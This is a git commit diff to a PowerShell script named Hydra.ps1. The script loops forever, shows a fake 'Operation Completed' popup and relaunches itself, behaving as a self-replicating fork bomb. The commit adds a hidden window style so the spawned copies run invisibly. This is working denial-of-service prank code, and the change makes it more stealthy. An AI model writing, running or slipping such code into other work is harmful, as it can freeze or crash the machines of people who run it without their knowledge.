30fbadb512d0f1eb4a3defc98d964aebab5472b0
Babyporkchop <93239527+Babyporkchop@users.noreply.github.com>
2022-11-04 15:03:54 +0800

    Update Hydra.ps1

--- Hydra/Hydra.ps1
+++ Hydra/Hydra.ps1
@@ -3,6 +3,6 @@ $app = "cmd.exe"
 $wshell = New-Object -ComObject Wscript.Shell
 while ($true){
 $wshell.Popup("Operation Completed",0,"Done",0x1)
-Start-Process powershell.exe -Argumentlist "-file .\Hydra.ps1"
+Start-Process powershell.exe -Argumentlist "-file .\Hydra.ps1" -windowstyle hidden
 }
 }
